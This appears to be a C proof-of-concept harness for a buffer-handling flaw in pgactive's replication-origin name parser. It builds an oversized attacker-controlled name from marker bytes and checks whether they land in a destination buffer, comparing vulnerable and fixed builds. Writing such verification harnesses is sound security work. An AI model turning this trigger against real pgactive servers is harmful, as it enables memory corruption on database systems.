#include "types.h"
#include <stdlib.h>

/* Defined by exactly one of generated/functions_vuln.c or functions_fixed.c. */
void pgactive_parse_replident_name(const char *riname, pgactiveNodeId * node, Oid *local_dboid);

char *g_dest = NULL;
int g_errors = 0;

/* Wire-shaped replication origin name: pgactive_<sysid>_<tl>_<db>_<localdb>_<name>
 * The trailing name is attacker-controlled in the reported threat model. */
static const char PREFIX[] = "pgactive_1_1_1_1_";
static const unsigned char MARK[4] = {0x48, 0x5a, 0x4d, 0x49};
#ifndef PAYLOAD_LEN
#define PAYLOAD_LEN 96
#endif

static void bytes4(const unsigned char *p, unsigned char *out)
{
	int i;
	for (i = 0; i < 4; i++)
		out[i] = p[i];
}

#ifdef CAPTURE_MODE
/* Invoked from the stand-in elog inside the pinned vulnerable function. */
void dump_chosen(void)
{
	unsigned char b[4];

	if (g_dest == NULL)
	{
		printf("CAPTURE=NONE\n");
		return;
	}
	bytes4((const unsigned char *) g_dest, b);
	printf("CAPTURE-IN=%02x%02x%02x%02x EXPECT=485a4d49\n", b[0], b[1], b[2], b[3]);
	bytes4((const unsigned char *) g_dest + 64, b);
	printf("CAPTURE-CANARY64=%02x%02x%02x%02x EXPECT=485a4d49\n", b[0], b[1], b[2], b[3]);
	bytes4((const unsigned char *) g_dest + PAYLOAD_LEN - 4, b);
	printf("CAPTURE-MARKTAIL=%02x%02x%02x%02x EXPECT=485a4d49\n", b[0], b[1], b[2], b[3]);
	fflush(stdout);
}
#endif

int main(int argc, char **argv)
{
	const char *mode = (argc > 1) ? argv[1] : "attack";
	int attack = (strcmp(mode, "attack") == 0);
	size_t n = sizeof(PREFIX) - 1;
	size_t payload = attack ? PAYLOAD_LEN : 0;
	size_t i;
	char riname[256];
	pgactiveNodeId node;
	Oid local_dboid = 0;

	if (n + payload + 1 > sizeof(riname))
		return 2;
	memcpy(riname, PREFIX, n);
	for (i = 0; i < payload; i++)
		riname[n + i] = (char) MARK[i % 4];
	riname[n + payload] = '\0';

	memset(&node, 0, sizeof(node));
	pgactive_parse_replident_name(riname, &node, &local_dboid);
	printf("MODE=%s NAME_LEN=%zu RET=%d SYSID=%lu TL=%u DB=%u LOCALDB=%u\n",
		   mode, n + payload, g_errors ? -1 : 0, node.sysid, node.timeline,
		   node.dboid, local_dboid);
	printf("DEST=%s\n", g_dest == NULL ? "NONE" : "CAPTURED");
	return 0;
}
